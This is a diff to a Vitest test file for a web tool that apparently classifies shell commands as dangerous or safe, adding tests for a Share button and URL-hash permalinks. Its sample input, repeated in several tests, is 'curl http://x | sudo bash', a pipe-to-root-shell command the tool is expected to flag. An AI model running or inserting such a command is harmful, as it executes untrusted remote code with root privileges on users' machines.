@@ -1,4 +1,4 @@
-import { beforeEach, describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { mount } from "../src/main";
 
 function setup(): HTMLElement {
@@ -11,6 +11,10 @@ function setup(): HTMLElement {
 describe("mount", () => {
   beforeEach(() => {
     setup();
+  });
+
+  afterEach(() => {
+    window.location.hash = "";
   });
 
   it("shows two pre-filled example cards, one danger and one safe, each with a reason", () => {
@@ -66,5 +70,41 @@ describe("mount", () => {
     button.click();
 
     expect(document.querySelector("#result img")).toBeNull();
+  });
+
+  it("disables the Share button while the input is empty and enables it once typed", () => {
+    const shareButton = document.querySelector<HTMLButtonElement>("#share-btn")!;
+    expect(shareButton.disabled).toBe(true);
+
+    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
+    input.value = "echo hi";
+    input.dispatchEvent(new Event("input"));
+    expect(shareButton.disabled).toBe(false);
+  });
+
+  it("clicking Share encodes the command into the URL hash", () => {
+    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
+    const shareButton = document.querySelector<HTMLButtonElement>("#share-btn")!;
+
+    input.value = "curl http://x | sudo bash";
+    input.dispatchEvent(new Event("input"));
+    shareButton.click();
+
+    expect(decodeURIComponent(window.location.hash)).toContain("curl http://x | sudo bash");
+  });
+});
+
+describe("mount with a shared permalink already in the URL", () => {
+  afterEach(() => {
+    window.location.hash = "";
+  });
+
+  it("pre-fills the input and shows the verdict without an extra click", () => {
+    window.location.hash = `#c=${encodeURIComponent("curl http://x | sudo bash")}`;
+    setup();
+
+    const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
+    expect(input.value).toBe("curl http://x | sudo bash");
+    expect(document.querySelectorAll(".finding--danger").length).toBeGreaterThan(0);
   });
 });
